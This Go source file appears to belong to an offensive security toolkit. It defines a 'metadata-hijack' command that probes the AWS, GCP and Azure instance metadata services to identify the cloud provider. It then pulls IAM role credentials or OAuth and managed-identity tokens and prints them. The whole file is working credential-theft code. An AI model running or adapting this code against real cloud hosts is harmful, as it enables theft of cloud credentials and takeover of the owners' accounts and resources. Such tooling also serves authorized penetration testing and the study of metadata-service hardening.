package modules

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

// MetadataHijackCmd represents the metadata hijack command
var MetadataHijackCmd = &cobra.Command{
	Use:   "metadata-hijack",
	Short: "Attempt to hijack cloud metadata service credentials",
	Long:  `Attempts to exfiltrate credentials from cloud metadata services (AWS, GCP, Azure)`,
	Run: func(cmd *cobra.Command, args []string) {
		Run()
	},
}

// Metadata endpoints for AWS, GCP, Azure
const (
	awsMetadataURL   = "http://169.254.169.254/latest/meta-data/"
	gcpMetadataURL   = "http://169.254.169.254/computeMetadata/v1/"
	azureMetadataURL = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
)

// Run executes the metadata hijack attack
func Run() {
	fmt.Println("[*] Running metadataHijack module...")

	switch detectCloudProvider() {
	case "AWS":
		hijackAWS()
	case "GCP":
		hijackGCP()
	case "AZURE":
		hijackAzure()
	default:
		fmt.Println("[!] Unable to detect cloud provider or access metadata service.")
	}
}

// detectCloudProvider probes cloud metadata endpoints to identify the cloud provider
func detectCloudProvider() string {
	client := http.Client{Timeout: 2 * time.Second}

	// AWS detection
	if resp, err := client.Get(awsMetadataURL); err == nil && resp.StatusCode == 200 {
		return "AWS"
	}

	// GCP detection
	req, _ := http.NewRequest("GET", gcpMetadataURL, nil)
	req.Header.Set("Metadata-Flavor", "Google")
	if resp, err := client.Do(req); err == nil && resp.StatusCode == 200 {
		return "GCP"
	}

	// Azure detection
	req, _ = http.NewRequest("GET", azureMetadataURL, nil)
	req.Header.Set("Metadata", "true")
	if resp, err := client.Do(req); err == nil && resp.StatusCode == 200 {
		return "AZURE"
	}

	return ""
}

func hijackAWS() {
	fmt.Println("[+] Cloud: AWS - Attempting credential exfiltration...")

	// IAM Role name
	roleNameURL := awsMetadataURL + "iam/security-credentials/"
	roleResp, err := http.Get(roleNameURL)
	if err != nil {
		fmt.Println("[-] Failed to retrieve IAM role name:", err)
		return
	}
	defer roleResp.Body.Close()
	roleNameRaw, _ := ioutil.ReadAll(roleResp.Body)
	roleName := strings.TrimSpace(string(roleNameRaw))

	// Get credentials
	credURL := awsMetadataURL + "iam/security-credentials/" + roleName
	credResp, err := http.Get(credURL)
	if err != nil {
		fmt.Println("[-] Failed to retrieve credentials:", err)
		return
	}
	defer credResp.Body.Close()
	creds, _ := ioutil.ReadAll(credResp.Body)

	fmt.Println("[+] IAM Role:", roleName)
	fmt.Println("[+] Credentials:\n", string(creds))
}

func hijackGCP() {
	fmt.Println("[+] Cloud: GCP - Attempting token exfiltration...")

	req, _ := http.NewRequest("GET", gcpMetadataURL+"instance/service-accounts/default/token", nil)
	req.Header.Set("Metadata-Flavor", "Google")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println("[-] Failed to retrieve GCP token:", err)
		return
	}
	defer resp.Body.Close()
	token, _ := ioutil.ReadAll(resp.Body)

	fmt.Println("[+] OAuth Token:\n", string(token))
}

func hijackAzure() {
	fmt.Println("[+] Cloud: Azure - Attempting token exfiltration...")

	req, _ := http.NewRequest("GET", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", nil)
	req.Header.Set("Metadata", "true")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println("[-] Failed to retrieve Azure MSI token:", err)
		return
	}
	defer resp.Body.Close()
	token, _ := ioutil.ReadAll(resp.Body)

	fmt.Println("[+] MSI Token:\n", string(token))
}
